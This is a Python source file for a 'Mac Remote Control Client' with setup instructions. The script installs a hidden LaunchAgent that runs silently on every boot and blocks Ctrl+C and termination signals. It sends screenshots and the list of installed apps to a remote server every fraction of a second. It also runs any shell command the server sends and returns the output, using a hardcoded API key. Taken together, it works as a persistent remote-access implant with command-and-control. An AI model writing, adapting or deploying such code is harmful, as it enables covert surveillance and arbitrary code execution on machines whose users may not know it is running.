"""
Mac Remote Control Client
=========================
Runs on your Mac. Polls the server for commands and streams screenshots.
Can ONLY be stopped via the Disconnect button on the dashboard.

FIRST TIME SETUP on any Mac:
  curl -O https://raw.githubusercontent.com/TESToz30/OpautoClicker/main/mac_client.py
  pip3 install pyautogui Pillow requests --prefer-binary
  python3 mac_client.py <name> --install

  --install registers it to start silently on every boot. No Terminal window.

TO UNINSTALL:
  python3 mac_client.py <name> --uninstall
"""

import pyautogui
import requests
import base64
import time
import io
import subprocess
import sys
import threading
import signal
import os
import plistlib
from PIL import Image

# ─── CONFIG ───────────────────────────────────────────────────────────────────

SERVER_URL = "https://remote-control-3gj9.onrender.com"
API_KEY = "key4api321"

POLL_INTERVAL = 1.0
SCREENSHOT_INTERVAL = 0.2
SCREENSHOT_QUALITY = 50
SCREENSHOT_HEIGHT = 420

# ──────────────────────────────────────────────────────────────────────────────

pyautogui.FAILSAFE = False
pyautogui.PAUSE = 0.05

signal.signal(signal.SIGINT, lambda s, f: None)   # block Ctrl+C
signal.signal(signal.SIGTERM, lambda s, f: None)

running = True

SCRIPT_PATH = os.path.abspath(__file__)
LAUNCH_AGENTS_DIR = os.path.expanduser("~/Library/LaunchAgents")
PLIST_LABEL = "com.remotecontrol.client"
PLIST_PATH = os.path.join(LAUNCH_AGENTS_DIR, f"{PLIST_LABEL}.plist")
LOG_PATH = os.path.expanduser("~/Library/Logs/remote_control.log")

def install(client_name):
    python = sys.executable
    os.makedirs(LAUNCH_AGENTS_DIR, exist_ok=True)

    plist = {
        "Label": PLIST_LABEL,
        "ProgramArguments": [python, SCRIPT_PATH, client_name],
        "RunAtLoad": True,
        "KeepAlive": True,
        "StandardOutPath": LOG_PATH,
        "StandardErrorPath": LOG_PATH,
        "ProcessType": "Background",
    }

    with open(PLIST_PATH, "wb") as f:
        plistlib.dump(plist, f)

    subprocess.run(["launchctl", "unload", PLIST_PATH], capture_output=True)
    result = subprocess.run(["launchctl", "load", PLIST_PATH], capture_output=True)

    if result.returncode == 0:
        print(f"✅ Installed! '{client_name}' will now start silently on every boot.")
        print(f"   It's running in the background right now.")
        print(f"   Logs: {LOG_PATH}")
        print(f"   To remove: python3 {SCRIPT_PATH} {client_name} --uninstall")
    else:
        print(f"❌ Install failed: {result.stderr.decode()}")

def uninstall():
    if os.path.exists(PLIST_PATH):
        subprocess.run(["launchctl", "unload", PLIST_PATH], capture_output=True)
        os.remove(PLIST_PATH)
        print("✅ Uninstalled. The client will no longer start on boot.")
    else:
        print("Nothing to uninstall.")

def get_client_name():
    args = [a for a in sys.argv[1:] if not a.startswith("--")]
    if args:
        return args[0]
    name = input("Enter a name for this machine (e.g. gaming-pc): ").strip()
    return name or "my-mac"

def take_screenshot_b64():
    img = pyautogui.screenshot()
    img = img.convert("RGB")
    w, h = img.size
    new_w = int(w * SCREENSHOT_HEIGHT / h)
    img = img.resize((new_w, SCREENSHOT_HEIGHT), Image.BILINEAR)
    buf = io.BytesIO()
    img.save(buf, format="JPEG", quality=SCREENSHOT_QUALITY, optimize=True)
    return base64.b64encode(buf.getvalue()).decode()

def upload_screenshot(client_name, headers):
    try:
        img_b64 = take_screenshot_b64()
        mx, my = pyautogui.position()
        sw, sh = pyautogui.size()
        requests.post(
            f"{SERVER_URL}/api/screenshot",
            json={"client": client_name, "image": img_b64,
                  "mouse_x": mx, "mouse_y": my, "screen_w": sw, "screen_h": sh},
            headers=headers, timeout=8
        )
    except Exception as e:
        pass  # silent in background mode

def execute_command(cmd, client_name, headers):
    global running
    t = cmd.get("type")
    args = cmd.get("args", {})
    try:
        if t == "shutdown":
            running = False
            os._exit(0)
        elif t == "click":
            pyautogui.click(int(args["x"]), int(args["y"]))
        elif t == "rclick":
            pyautogui.rightClick(int(args["x"]), int(args["y"]))
        elif t == "dclick":
            pyautogui.doubleClick(int(args["x"]), int(args["y"]))
        elif t == "move":
            pyautogui.moveTo(int(args["x"]), int(args["y"]), duration=0.2)
        elif t == "move_relative":
            cx, cy = pyautogui.position()
            pyautogui.moveTo(cx + int(args["dx"]), cy + int(args["dy"]), duration=0)
        elif t == "type":
            pyautogui.typewrite(str(args["text"]), interval=0.03)
        elif t == "key":
            keys = str(args["combo"]).lower().split("+")
            if len(keys) == 1:
                pyautogui.press(keys[0])
            else:
                pyautogui.hotkey(*keys)
        elif t == "scroll":
            pyautogui.scroll(int(args["amount"]), x=int(args["x"]), y=int(args["y"]))
        elif t == "run":
            subprocess.Popen(["open", "-a", str(args["app"])])
        elif t == "shell":
            result = subprocess.run(
                str(args["cmd"]), shell=True, capture_output=True, text=True, timeout=15
            )
            output = (result.stdout + result.stderr).strip() or "(no output)"
            requests.post(f"{SERVER_URL}/api/terminal_output",
                json={"client": client_name, "output": output},
                headers=headers, timeout=8)
    except Exception as e:
        pass

def scan_apps():
    apps = []
    for entry in os.listdir("/Applications"):
        if entry.endswith(".app"):
            apps.append(entry[:-4])
    return sorted(apps, key=lambda x: x.lower())

def upload_app_list(client_name, headers):
    try:
        apps = scan_apps()
        requests.post(f"{SERVER_URL}/api/apps",
            json={"client": client_name, "apps": apps},
            headers=headers, timeout=8)
    except Exception:
        pass

def screenshot_loop(client_name, headers):
    while running:
        upload_screenshot(client_name, headers)
        time.sleep(SCREENSHOT_INTERVAL)

def poll_loop(client_name, headers):
    while running:
        try:
            r = requests.get(f"{SERVER_URL}/api/poll",
                params={"client": client_name}, headers=headers, timeout=8)
            if r.status_code == 200:
                for cmd in r.json().get("commands", []):
                    execute_command(cmd, client_name, headers)
        except Exception:
            pass
        time.sleep(POLL_INTERVAL)

def main():
    client_name = get_client_name()
    flags = [a for a in sys.argv[1:] if a.startswith("--")]

    if "--uninstall" in flags:
        uninstall()
        return

    if "--install" in flags:
        install(client_name)
        return

    headers = {"X-API-Key": API_KEY, "Content-Type": "application/json"}
    upload_app_list(client_name, headers)

    t = threading.Thread(target=screenshot_loop, args=(client_name, headers), daemon=True)
    t.start()
    poll_loop(client_name, headers)

if __name__ == "__main__":
    main()
